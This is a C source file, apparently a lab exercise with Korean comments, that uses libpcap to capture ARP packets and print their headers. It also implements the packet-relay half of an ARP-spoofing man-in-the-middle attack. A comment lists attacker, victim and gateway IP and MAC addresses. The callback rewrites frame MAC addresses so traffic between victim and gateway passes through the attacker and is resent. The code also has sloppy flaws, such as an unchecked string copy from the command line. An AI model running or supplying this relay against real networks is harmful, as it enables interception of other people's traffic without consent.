#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS

#include <winsock2.h>
#include <pcap.h>
#include <stdio.h>
#include <string.h>

#define MAC_ADDR_LEN 6
#define IP_ADDR_LEN 4
#define BUF_SIZE 100
#define SNAPLEN 65536
#define ARP_HEADER_JMP 14


pcap_t *use_dev;

//이더넷 헤더
struct ethernet_header {
	unsigned char dest_mac[MAC_ADDR_LEN];
	unsigned char src_mac[MAC_ADDR_LEN];
	unsigned short eth_type;
};
//arp 헤더
struct arp_header {
	unsigned short hardware_type;
	unsigned short protocol_type;
	unsigned char hardware_length;
	unsigned char protocol_length;
	unsigned short opcode;
	unsigned char sender_mac[MAC_ADDR_LEN];
	unsigned char sender_ip[IP_ADDR_LEN];
	unsigned char target_mac[MAC_ADDR_LEN];
	unsigned char target_ip[IP_ADDR_LEN];
};

//함수선언
void print_ether_header(const unsigned char *pkt_data);
void print_arp_header(const unsigned char *pkt_data);
void callback(unsigned char *param, const struct pcap_pkthdr *header, const unsigned char *pkt_data);

//main 시작
int main(int argc, char **argv) {
	//네트워크 장치 불러옴
	pcap_if_t *alldevs = NULL;
	pcap_if_t *dev;
	
	char errbuf[BUF_SIZE];
	char FILTER_RULE[BUF_SIZE] = "arp";
	struct bpf_program rule_struct;
	int i, dev_num, res;
	struct pcap_pkthdr *header;
	const unsigned char *pkt_data;

	if (argv[1]) {
		strcpy(FILTER_RULE, "port ");
		strcat(FILTER_RULE, argv[1]);
	}

	if (pcap_findalldevs(&alldevs, errbuf) < 0) {
		printf("Device Find Error\n");
		return -1;
	}

	for (dev = alldevs, i = 0; dev != NULL; dev = dev->next) {
		printf("%d번 Device : %s (%s)\n", ++i, dev->name, dev->description);
	}
	printf("사용할 디바이스 번호 입력 : ");
	scanf("%d", &dev_num);

	for (dev = alldevs, i = 0; i < dev_num - 1; dev = dev->next, i++);

	if ((use_dev = pcap_open_live(dev->name, SNAPLEN, 1, 1000, errbuf)) == NULL) {
		printf("pcap_open ERROR!\n");
		pcap_freealldevs(alldevs);
		return -1;
	}
	printf("pcap_open 성공!\n");
	printf("FILTER_FULE : %s\n", FILTER_RULE);

	// pcap_open success!

	if (pcap_compile(use_dev, &rule_struct, FILTER_RULE, 1, NULL) < 0) {
		printf("pcap_compile ERROR!\n");
		pcap_freealldevs(alldevs);
		return -1;
	}

	if (pcap_setfilter(use_dev, &rule_struct) < 0) {
		printf("pcap_setfilter ERROR!\n");
		pcap_freealldevs(alldevs);
		return -1;
	}

	pcap_freealldevs(alldevs);

	while ((res = pcap_next_ex(use_dev, &header, &pkt_data)) >= 0) {
		if (res == 0) continue;

		print_ether_header(pkt_data);
		pkt_data += ARP_HEADER_JMP;
		print_arp_header(pkt_data);

		pcap_loop(use_dev, 0, callback, NULL);
		pcap_close(use_dev);
	}

	/*pcap_loop(use_dev, 0, callback, NULL);
	pcap_close(use_dev);
	*/
	return 0;
}
//main 끝

/////print 함수//////
void print_ether_header(const unsigned char *pkt_data) {
	struct ethernet_header *eh;
	eh = (struct ethernet_header *)pkt_data;
	unsigned short ether_type = ntohs(eh->eth_type);
	if (ether_type == 0x0800) printf("======IPv4======");
	printf("\n======ETHERNET======\n");
	printf("Src MAC : \n");
	for (int i = 0; i <= 5; i++) printf("%02x ", eh->src_mac[i]);
	printf("Des MAC : ");
	for (int i = 0; i <= 5; i++) printf("%02x ", eh->dest_mac[i]);
	printf("\n");

}

void print_arp_header(const unsigned char *pkt_data) {
	struct arp_header *ah;
	ah = (struct arp_header *)pkt_data;
	printf("======ARP=====\n");
	printf("Sender MAC : ");
	for (int i = 0; i <= 5; i++) printf("%02x ", ah->sender_mac[i]);
	printf("\n Sender IP : ");
	for (int i = 0; i <= 3; i++) printf("%d.", ah->sender_ip[i]);
	printf("\nTarget MAC : ");
	for (int i = 0; i <= 5; i++) printf("%02x ", ah->target_mac[i]);
	printf("\n Target IP : \n");
	for (int i = 0; i <= 3; i++) printf("%d.", ah->target_ip[i]);

}
/*공격자 ip : 192.168.25.15
공격자 mac : 00:e0:4c:61:c8:1f
피해자 ip : 192.168.25.16
피해자 mac : 00.0c.29.18.38.4b

gateway ip : 192.168.25.1
gateway mac : 00.01.36.f4.54.97

*/
void callback(unsigned char *param, const struct pcap_pkthdr *header, const unsigned char *pkt_data) {
	struct ethernet_header *eh;
	eh = (struct ethernet_header *)pkt_data;

	unsigned char VICTIM_MAC[MAC_ADDR_LEN] = { 0x00,0x0c,0x29,0x18,0x38,0x4b };
	unsigned char ATTACK_MAC[MAC_ADDR_LEN] = { 0x00,0xe0,0x4c,0x61,0xc8,0x1f };
	unsigned char GATEWAY_MAC[MAC_ADDR_LEN] = { 0x00,0x01,0x36,0xf4,0x54,0x97 };

	if ((memcmp(VICTIM_MAC, eh->src_mac, sizeof(eh->src_mac))) == 0) {
		printf("VICTIM -> GATEWAY \n");
		memcpy(eh->src_mac, ATTACK_MAC, sizeof(eh->src_mac));
		memcpy(eh->dest_mac, GATEWAY_MAC, sizeof(eh->dest_mac));
	}

	if ((memcmp(GATEWAY_MAC, eh->src_mac, sizeof(eh->src_mac))) == 0)
	{
		printf("GATEWAY -> VICTIM\n");
		memcpy(eh->src_mac, ATTACK_MAC, sizeof(eh->src_mac));
		memcpy(eh->dest_mac, VICTIM_MAC, sizeof(eh->dest_mac));
	}
	//attacker -> attacker
	if ((memcmp(ATTACK_MAC, eh->src_mac, sizeof(eh->src_mac))) && (memcmp(ATTACK_MAC, eh->dest_mac, sizeof(eh->dest_mac)))==0) {
		printf("ATTACK -> GATEWAY");
		memcpy(eh->dest_mac, GATEWAY_MAC, sizeof(eh->dest_mac));
	}

	pcap_sendpacket(use_dev, pkt_data, header->caplen);
}